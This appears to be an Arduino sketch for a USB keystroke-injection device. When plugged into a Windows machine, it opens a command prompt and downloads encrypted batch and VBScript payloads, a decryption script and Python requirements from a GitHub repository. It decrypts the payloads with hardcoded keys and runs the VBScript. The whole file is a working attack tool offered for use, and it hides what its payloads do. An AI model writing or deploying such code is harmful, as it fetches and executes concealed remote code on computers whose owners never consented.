#include <Keyboard.h>

// Hidden credentials for decryption
const char* password = "YourPassword";  // Replace with your actual password
const char* salt = "a726d3cd829c72204ae1add61be23ffa";
const char* iv_bat = "c835c64d5b9d758fd29823f7ee855801";
const char* iv_vbs = "d990fa53364de877296723a207f91ac5";

// URLs to encrypted files, Python script, and requirements.txt
const char* url_bat = "https://github.com/techsingkillmonger/test/raw/refs/heads/main/encrypted_script_bat.enc";
const char* url_vbs = "https://github.com/techsingkillmonger/test/raw/refs/heads/main/encrypted_script_vbs.enc";
const char* url_python = "https://github.com/techsingkillmonger/test/raw/refs/heads/main/decrypt.py";
const char* url_requirements = "https://github.com/techsingkillmonger/test/raw/refs/heads/main/requirements.txt";

void setup() {
  Keyboard.begin();
  delay(5000); // Delay to ensure the system is ready

  // Open CMD
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  // Navigate to Desktop
  Keyboard.print("cd %userprofile%\\Desktop");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  // Download encrypted files, decryption script, and requirements.txt
  Keyboard.print("curl -L ");
  Keyboard.print(url_bat);
  Keyboard.print(" -o encrypted_script_bat.enc && curl -L ");
  Keyboard.print(url_vbs);
  Keyboard.print(" -o encrypted_script_vbs.enc && curl -L ");
  Keyboard.print(url_python);
  Keyboard.print(" -o decrypt.py && curl -L ");
  Keyboard.print(url_requirements);
  Keyboard.print(" -o requirements.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000); // Wait for downloads to complete

  // Install Python requirements
  Keyboard.print("python -m pip install -r requirements.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000); // Wait for installation to complete

  // Run Python script to decrypt files
  Keyboard.print("python decrypt.py encrypted_script_bat.enc deletesc.bat ");
  Keyboard.print(password);
  Keyboard.print(" ");
  Keyboard.print(salt);
  Keyboard.print(" ");
  Keyboard.print(iv_bat);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(3000); // Allow time for decryption

  Keyboard.print("python decrypt.py encrypted_script_vbs.enc test.vbs ");
  Keyboard.print(password);
  Keyboard.print(" ");
  Keyboard.print(salt);
  Keyboard.print(" ");
  Keyboard.print(iv_vbs);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(3000); // Allow time for decryption

  // Run the decrypted .vbs script
  Keyboard.print("cscript test.vbs");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {
  // Nothing in loop
}
